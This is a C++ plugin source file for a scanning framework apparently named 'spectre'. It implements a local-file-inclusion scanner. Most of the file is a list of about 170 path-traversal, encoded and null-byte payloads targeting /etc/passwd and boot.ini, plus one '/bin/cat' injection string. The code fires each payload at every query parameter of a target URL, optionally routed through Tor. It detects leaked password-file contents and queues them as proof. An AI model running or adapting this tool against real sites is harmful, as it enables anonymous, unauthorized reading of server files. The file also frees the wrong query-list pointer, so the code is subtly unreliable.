#include "spectre/plugin.h"
#include "spectre/proof_queue.h"
#include "spectre/tor_proxy.h"
#include <cpr/cpr.h>
#include <iostream>
#include <nlohmann/json.hpp>
#include <uriparser/Uri.h>
#include <regex>

namespace {

class LFIScanner : public spectre::Plugin {
    std::vector<std::string> payloads = {
        R"(/etc/passwd%2500)",
        R"(/etc/passwd%00	)",
        R"(/etc/passwd)",
        R"(///etc///passwd%2500)",
        R"(///etc///passwd%00)",
        R"(///etc///passwd)",
        R"(../etc/passwd%2500)",
        R"(../etc/passwd%00)",
        R"(../etc/passwd)",
        R"(..///etc///passwd%2500)",
        R"(..///etc///passwd%00)",
        R"(..///etc///passwd)",
        R"(..///..///etc///passwd%2500)",
        R"(..///..///etc///passwd%00)",
        R"(..///..///etc///passwd)",
        R"(..///..///..///etc///passwd%2500)",
        R"(..///..///..///etc///passwd%00)",
        R"(..///..///..///etc///passwd)",
        R"(..///..///..///..///etc///passwd%2500)",
        R"(..///..///..///..///etc///passwd%00)",
        R"(..///..///..///..///etc///passwd)",
        R"(..///..///..///..///..///etc///passwd%2500)",
        R"(..///..///..///..///..///etc///passwd%00)",
        R"(..///..///..///..///..///etc///passwd)",
        R"(..///..///..///..///..///..///etc///passwd%2500)",
        R"(..///..///..///..///..///..///etc///passwd%00)",
        R"(..///..///..///..///..///..///etc///passwd)",
        R"(..///..///..///..///..///..///..///etc///passwd%2500)",
        R"(..///..///..///..///..///..///..///etc///passwd%00)",
        R"(..///..///..///..///..///..///..///etc///passwd)",
        R"(..///..///..///..///..///..///..///..///etc///passwd%2500)",
        R"(..///..///..///..///..///..///..///..///etc///passwd%00)",
        R"(..///..///..///..///..///..///..///..///etc///passwd)",
        R"(../../etc/passwd%2500)",
        R"(../../etc/passwd%00)",
        R"(../../etc/passwd)",
        R"(../../../etc/passwd%2500)",
        R"(../../../etc/passwd%00)",
        R"(../../../etc/passwd)",
        R"(../../../../etc/passwd%2500)",
        R"(../../../../etc/passwd%00)",
        R"(../../../../etc/passwd%00)",
        R"(../../../../etc/passwd)",
        R"(../../../../../etc/passwd%00)",
        R"(../../../../../etc/passwd)",
        R"(../../../../../../etc/passwd%2500)",
        R"(../../../../../../etc/passwd%00)",
        R"(../../../../../../etc/passwd)",
        R"(../../../../../../../etc/passwd%2500)",
        R"(../../../../../../../etc/passwd%00)",
        R"(../../../../../../../etc/passwd)",
        R"(../../../../../../../../etc/passwd%2500)",
        R"(../../../../../../../../etc/passwd%00)",
        R"(../../../../../../../../etc/passwd)",
        R"(\etc\passwd%2500)",
        R"(\etc\passwd%00)",
        R"(\etc\passwd)",
        R"(..\etc\passwd%2500)",
        R"(..\etc\passwd%00)",
        R"(..\etc\passwd)",
        R"(..\..\etc\passwd%2500)",
        R"(..\..\etc\passwd%00)",
        R"(..\..\etc\passwd)",
        R"(..\..\..\etc\passwd%2500)",
        R"(..\..\..\etc\passwd%00)",
        R"(..\..\..\etc\passwd)",
        R"(..\..\..\..\etc\passwd%2500)",
        R"(..\..\..\..\etc\passwd%00)",
        R"(..\..\..\..\etc\passwd)",
        R"(..\..\..\..\..\etc\passwd%2500)",
        R"(..\..\..\..\..\etc\passwd%00)",
        R"(..\..\..\..\..\etc\passwd)",
        R"(..\..\..\..\..\..\etc\passwd%2500)",
        R"(..\..\..\..\..\..\etc\passwd%00)",
        R"(..\..\..\..\..\..\etc\passwd)",
        R"(..\..\..\..\..\..\..\etc\passwd%2500)",
        R"(..\..\..\..\..\..\..\etc\passwd%00)",
        R"(..\..\..\..\..\..\..\etc\passwd)",
        R"(..\..\..\..\..\..\..\..\etc\passwd%2500)",
        R"(..\..\..\..\..\..\..\..\etc\passwd%00)",
        R"(..\..\..\..\..\..\..\..\etc\passwd)",
        R"(%00../../../../../../etc/passwd)",
        R"(%00/etc/passwd%00)",
        R"(%0a/bin/cat%20/etc/passwd)",
        R"(/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd)",
        R"(..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd)",
        R"(..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd)",
        R"(\&apos;/bin/cat%20/etc/passwd\&apos;)",
        R"(/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd)",
        R"(/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd)",
        R"(/etc/default/passwd)",
        R"(/etc/master.passwd)",
        R"(././././././././././././etc/passwd)",
        R"(.//.//.//.//.//.//.//.//.//.//.//.//etc//passwd)",
        R"(/./././././././././././etc/passwd)",
        R"(/../../../../../../../../../../etc/passwd)",
        R"(/../../../../../../../../../../etc/passwd^^)",
        R"(/..\../..\../..\../..\../..\../..\../..\../etc/passwd)",
        R"(/etc/passwd)",
        R"(../../../../../../../../../../../../etc/passwd)",
        R"(../../../../../../../../../../../etc/passwd)",
        R"(../../../../../../../../../../etc/passwd)",
        R"(../../../../../../../../../etc/passwd)",
        R"(../../../../../../../../etc/passwd)",
        R"(../../../../../../../etc/passwd)",
        R"(../../../../../../etc/passwd)",
        R"(../../../../../etc/passwd)",
        R"(../../../../etc/passwd)",
        R"(../../../etc/passwd)",
        R"(../../etc/passwd)",
        R"(../etc/passwd)",
        R"(..\..\..\..\..\..\..\..\..\..\etc\passwd)",
        R"(\..\..\..\..\..\..\..\..\..\..\etc\passwd)",
        R"(etc/passwd)",
        R"(/etc/passwd%00)",
        R"(../../../../../../../../../../../../etc/passwd%00)",
        R"(../../../../../../../../../../../etc/passwd%00)",
        R"(../../../../../../../../../../etc/passwd%00)",
        R"(../../../../../../../../../etc/passwd%00)",
        R"(../../../../../../../../etc/passwd%00)",
        R"(../../../../../../../etc/passwd%00)",
        R"(../../../../../../etc/passwd%00)",
        R"(../../../etc/passwd%00)",
        R"(../../etc/passwd%00)",
        R"(../etc/passwd%00)",
        R"(..\..\..\..\..\..\..\..\..\..\etc\passwd%00)",
        R"(\..\..\..\..\..\..\..\..\..\..\etc\passwd%00)",
        R"(/../../../../../../../../../../../etc/passwd%00.html)",
        R"(/../../../../../../../../../../../etc/passwd%00.jpg)",
        R"(../../../../../../etc/passwd&=%3C%3C%3C%3C)",
        R"(..2fetc2fpasswd)",
        R"(..2fetc2fpasswd%00)",
        R"(..2f..2fetc2fpasswd)",
        R"(..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2f..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2f..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2f..2f..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2f..2f..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00)",
        R"(..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd)",
        R"(..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00)",
        R"(%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini)",
        R"(%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini)",
        R"(..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini)",
        R"(..\../..\../..\../..\../..\../..\../..\../..\../boot.ini)",
        R"(..//..//..//..//..//boot.ini)",
        R"(../../../../../../../../../../../../boot.ini)",
        R"(../../boot.ini)",
        R"(..\../..\../..\../..\../boot.ini)",
        R"(../../../../../../../../../../../../boot.ini%00)",
        R"(/../../../../../../../../../../../boot.ini%00.html)",
        R"(..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini)",
        R"(C:/boot.ini)",
        R"(../../../../../../../../../../../../boot.ini#)",
        R"(../../../../../../../../../../../boot.ini#.html)"
    };
public:
    std::string name() const override { return "lfi_scanner"; }

    void handle_task(const spectre::Task &task) override {
        if (task.data.value("type", "") != name()) {
            return;
        }

        std::string url = task.data.value("target", "");
        if (url.empty()) {
            return;
        }

        std::cout << "[lfi_scanner] scanning " << url << std::endl;

        UriUriA uri;
        if (uriParseSingleUriA(&uri, url.c_str(), nullptr) != URI_SUCCESS) {
            return;
        }

        if (uri.query.first) {
            UriQueryListA* query_list;
            int item_count;
            if (uriDissectQueryMallocA(&query_list, &item_count, uri.query.first, uri.query.afterLast) == URI_SUCCESS) {
                for (int i = 0; i < item_count; ++i) {
                    std::string param_name = query_list->key;
                    for (const auto& payload : payloads) {
                        test_payload(url, param_name, payload);
                    }
                    query_list = query_list->next;
                }
                uriFreeQueryListA(query_list);
            }
        }
        uriFreeUriMembersA(&uri);
    }

private:
    void test_payload(const std::string& base_url, const std::string& param, const std::string& payload) {
        std::string malicious_url = base_url;
        std::regex param_regex(param + "=[^&]*");
        malicious_url = std::regex_replace(malicious_url, param_regex, param + "=" + payload);

        cpr::Session session;
        session.SetUrl(cpr::Url{malicious_url});
        session.SetTimeout(cpr::Timeout{10000});
        if (spectre::TorProxy::get_instance().is_available()) {
            session.SetProxies({{"http", "socks5://127.0.0.1:9050"},
                                {"https", "socks5://127.0.0.1:9050"}});
        }
        cpr::Response r = session.Get();

        if (r.status_code == 200 && r.text.find("root:x:0:0") != std::string::npos) {
            std::cout << "[lfi_scanner] VULNERABILITY DISCOVERED" << std::endl;
            std::cout << "  -> Target: " << base_url << std::endl;
            std::cout << "  -> Payload: " << payload << std::endl;
            submit_proof(base_url, payload, malicious_url);
        }
    }

    void submit_proof(const std::string &target, const std::string &payload, const std::string& vulnerable_url) {
        nlohmann::json evidence;
        evidence["description"] = "A Local File Inclusion (LFI) vulnerability was discovered. The server's /etc/passwd file was exposed.";
        evidence["payload"] = payload;
        evidence["vulnerable_url"] = vulnerable_url;

        spectre::VulnProof proof = {
            target,
            "LFI",
            evidence,
            std::to_string(std::time(nullptr)),
            ""
        };
        spectre::enqueue_proof(proof);
        std::cout << "[lfi_scanner] proof queued" << std::endl;
    }
};

} // namespace


extern "C" spectre::Plugin* spectre_create_plugin() {
    return new LFIScanner();
} 